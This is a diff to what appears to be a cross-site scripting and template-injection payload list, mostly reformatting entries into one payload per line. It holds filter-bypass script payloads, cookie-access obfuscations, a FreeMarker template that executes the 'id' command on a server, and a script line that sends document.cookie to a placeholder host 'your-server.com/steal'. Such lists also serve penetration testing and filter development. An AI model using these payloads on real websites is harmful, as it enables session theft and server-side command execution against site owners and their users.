@@ -19,9 +19,8 @@ javascript:eval('alert(1)')
 ${alert(1)}
 {alert(1)}
 data:text/html,<script>alert(1)</script>
-"'-alert(1)-'",
-'\\\'-alert(1)//',
-'</script><script>alert(1)</script>',
+\'-alert(1)//
+</script><script>alert(1)</script>
 
 # ============ WAF Bypass ============
 <svg><script>alert&#40;1&#41</script>
@@ -64,22 +63,20 @@ javascript:"/*'/*`/*--></styles></script><svg/onload=alert(1)>"
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
 <embed code="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
 <script>fetch('https://your-server.com/steal?data='+btoa(document.cookie))</script>
-'<svg onload=alert(1)>',
-'{{constructor.constructor("alert(1)")()}}',
-'<math><maction actiontype="statusline#https://google.com" xlink:href="javascript:alert(1)">CLICK',
+<svg onload=alert(1)>
+{{constructor.constructor("alert(1)")()}}
+<math><maction actiontype="statusline#https://google.com" xlink:href="javascript:alert(1)">CLICK
 
 # ============ Template Injection ============
 {{constructor.constructor('alert(1)')()}}
 #{alert(1)}
-${alert(1)}
 <%alert(1)%>
 ${"7".repeat(7)}
-'{{7*7}}',
-'<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }',
+{{7*7}}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
 
 # ============ Server-Side ============
 ${7*7}
-{{7*7}}
 <%= 7*7 %>
 
 # ============ CSS Injection ============
@@ -93,16 +90,14 @@ javascript://%0Dalert(1)
 data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 
 # ============ FUZZ ============
-'javascript:alert`1`',
-'"><iframe src="javascript:alert(1)">',
-'"><video><source onerror="alert(1)">',
+javascript:alert`1`
+"><iframe src="javascript:alert(1)">
+"><video><source onerror="alert(1)">
 
 # ============ VPN ============
-'<img src=x oneonerror=alert(1)>',
-'{alert(1)}',
-'<img/src="x"/onerror=alert(1)>',
-'<img src="x:xxx" onerror="alert(1)">',
-'<svg><script>alert(1)</script>'
+<img src=x onerror=alert(1)>
+<img src="x:xxx" onerror="alert(1)">
+<svg><script>alert(1)</script>
 
 # ============ Redirection ============
 document.location=
@@ -118,7 +113,7 @@ document.location.replace()
 window.open("link", "_blank");
 
 # ============ Cookies =============
-document.cookie 
+document.cookie
 document['cookie']
 with(document)alert(cookie)
 doc\u0075ment.cookie
@@ -142,7 +137,6 @@ window["doc"+"ument"]["cookie"]
 <details ontoggle=alert(1) open>
 
 # ============ Some random payloads ============
-'-alert(1)-'
 "-alert(1)-"
 );alert(1)//
 ';alert(1)//
